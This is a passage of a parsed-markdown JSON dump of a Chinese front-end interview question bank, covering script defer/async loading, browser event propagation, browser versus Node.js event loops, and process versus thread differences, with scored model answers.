DOM，完成后才会从暂停的地方重新开始。","escaped":false}]}]},{"type":"list_item","raw":"+ 如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。\\n","task":false,"loose":false,"text":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","tokens":[{"type":"text","raw":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","text":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","tokens":[{"type":"text","raw":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","text":"如果你想首屏渲染的越快，就越不应该在首屏就加载 JS 文件，这也是都建议将 script 标签放在 body 标签底部的原因。","escaped":false}]}]},{"type":"list_item","raw":"+ script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。\\n","task":false,"loose":false,"text":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","tokens":[{"type":"text","raw":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","text":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","tokens":[{"type":"text","raw":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","text":"script 标签加上 defer 属性以后，表示该 JS 文件会并行下载，但是会放到 HTML 解析完成后顺序执行，所以对于这种情况你可以把 script 标签放在任意位置。","escaped":false}]}]},{"type":"list_item","raw":"+ 对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","task":false,"loose":false,"text":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","tokens":[{"type":"text","raw":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","text":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","tokens":[{"type":"text","raw":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","text":"对于没有任何依赖的 JS 文件可以加上 async 属性，表示 JS 文件下载和解析不会阻塞渲染。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器的事件机制\\n\\n","depth":2,"text":"浏览器的事件机制","tokens":[{"type":"text","raw":"浏览器的事件机制","text":"浏览器的事件机制","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- 浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- 浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","task":false,"loose":false,"text":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","tokens":[{"type":"text","raw":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","text":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","tokens":[{"type":"text","raw":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","text":"浏览器的事件机制主要涉及到事件的触发、传播和处理。当用户在浏览器中进行某些操作，如点击按钮、移动鼠标或输入文本时，会触发相应的事件。这些事件被封装为event对象，包含了事件的属性和方法，供开发者在事件处理函数中使用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","text":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","tokens":[{"type":"text","raw":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","text":"事件的传播过程分为三个阶段：捕获阶段、目标阶段和冒泡阶段。在DOM2级事件模型中，事件首先在最外层HTML元素上开始捕获，然后向下传递到事件的目标元素，沿途触发所有设置了捕获事件处理器的元素。接着，事件处理器在事件的目标元素上执行，这是事件处理的核心阶段。最后，事件从目标元素向上回溯，触发所有设置了冒泡事件处理器的元素，完成冒泡阶段。这种机制允许开发者在事件传播的不同阶段拦截并处理事件。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","text":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","tokens":[{"type":"text","raw":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","text":"常见的事件类型包括鼠标事件（如click、mouseover、mousedown等）、键盘事件（如keydown、keyup、keypress等）以及表单事件（如submit、input、change等）。这些事件为开发者提供了丰富的交互能力，可以响应用户的各种操作并相应地更新页面内容。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","text":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","tokens":[{"type":"text","raw":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","text":"在事件处理过程中，浏览器还维护一个事件队列。一旦事件队列中的事件得到处理，它就会被移除。此外，浏览器还支持宏任务和微任务的概念，用于管理异步执行的任务。例如，setTimeout、setInterval等是常见的宏任务，而Promise的回调则是微任务。这些任务的执行顺序和优先级也是事件机制的一部分。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 浏览器的事件循环和node的事件循环区别\\n\\n","depth":2,"text":"浏览器的事件循环和node的事件循环区别","tokens":[{"type":"text","raw":"浏览器的事件循环和node的事件循环区别","text":"浏览器的事件循环和node的事件循环区别","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- 浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。\\n\\n  首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。\\n\\n  其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。\\n\\n  另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。\\n\\n  首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。\\n\\n  其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。\\n\\n  另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","task":false,"loose":true,"text":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。\\n\\n首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。\\n\\n其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。\\n\\n另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","tokens":[{"type":"text","raw":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","text":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","tokens":[{"type":"text","raw":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","text":"浏览器的事件循环和Node.js的事件循环虽然都用于处理异步操作和事件驱动编程，但在实现方式和具体细节上存在一些区别。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","text":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","tokens":[{"type":"text","raw":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","text":"首先，从执行环境来看，浏览器中的事件循环主要运行在Javascript引擎和渲染引擎之间，这可能会导致线程阻塞，尤其是在渲染进程和事件循环共享同一个线程时。而Node.js中的事件循环是运行在单独的线程中，基于事件驱动模型，通过事件循环来处理和派发事件，以及执行相应的回调函数。这种设计使得Node.js可以处理大量的并发请求。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","text":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","tokens":[{"type":"text","raw":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","text":"其次，在宏任务和微任务的处理上，两者也有所不同。在浏览器中，宏任务和微任务是通过HTML5规范中定义的消息队列来实现的。所有的异步任务都被分为宏任务和微任务两种类型，并依次加入到对应的队列中。当当前的宏任务执行完毕后，会立即执行所有的微任务，然后再选择下一个宏任务执行。而Node.js使用libuv库提供的事件循环机制来管理宏任务，并使用process.nextTick()方法来实现微任务。在Node.js的事件循环中，所有的宏任务都被分为6个不同的阶段，每个阶段会执行一些同步和异步的操作。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"text","raw":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","text":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","tokens":[{"type":"text","raw":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","text":"另外，两者处理的事件类型也有所区别。浏览器中的事件循环主要用于处理用户交互事件（例如点击、滚动等）和网络请求等异步任务。而Node.js的事件循环则主要用于处理I/O操作（例如文件操作、网络请求等）和自定义的事件。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 进程和线程的区别?\\n\\n","depth":2,"text":"进程和线程的区别?","tokens":[{"type":"text","raw":"进程和线程的区别?","text":"进程和线程的区别?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"list","raw":"- . 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n\\n- . 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n\\n- 进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n  \\n- 由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- . 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n\\n","task":false,"loose":true,"text":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n","tokens":[{"type":"text","raw":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。\\n","text":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。","tokens":[{"type":"text","raw":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。","text":". 进程是系统分配资源的基本单位，它包含独立的地址空间、资源表、堆栈、程序计数器等，每个进程都有独立的内存空间和系统资源。而线程是进程的一个实体，是CPU调度和分派的基本单位，线程只拥有一点在运行中必不可少的资源（如程序计数器，一组寄存器和栈），但它可与同属一个进程的其他的线程共享进程所拥有的全部资源。","escaped":false}]}]},{"type":"list_item","raw":"- . 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n\\n","task":false,"loose":true,"text":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n","tokens":[{"type":"text","raw":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。\\n","text":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。","tokens":[{"type":"text","raw":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。","text":". 由于线程共享进程的内存空间和资源，因此线程间的切换开销小，有利于并发执行。而进程间的切换需要涉及系统资源（如内存、打开的文件等）的分配与回收，开销较大。","escaped":false}]}]},{"type":"list_item","raw":"- 进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n  \\n","task":false,"loose":true,"text":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n","tokens":[{"type":"text","raw":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。\\n","text":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。","tokens":[{"type":"text","raw":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。","text":"进程是独立运行的，拥有独立的系统资源，包括内存、CPU时间、磁盘空间等。而线程只是进程的一个执行路径，共享进程的资源，因此线程之间没有独立的地址空间，一个线程死掉就等于整个进程死掉。","escaped":false}]}]},{"type":"list_item","raw":"- 由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","task":false,"loose":true,"text":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","tokens":[{"type":"text","raw":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","text":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","tokens":[{"type":"text","raw":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","text":"由于创建或撤销进程时，系统都要为之分配或回收资源，如内存空间、I/O设备等，所付出的开销远大于创建或撤销线程时的开销。同样，在进行进程切换时，涉及当前执行进程CPU环境的保存、新调度进程CPU环境的设置、各种进程资源状态的更改（如内存管理中的数据段、堆栈段和指针的更改）等，而线程切换只需保存和设置少量寄存器内容，不涉及存储管理等方面的操作。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 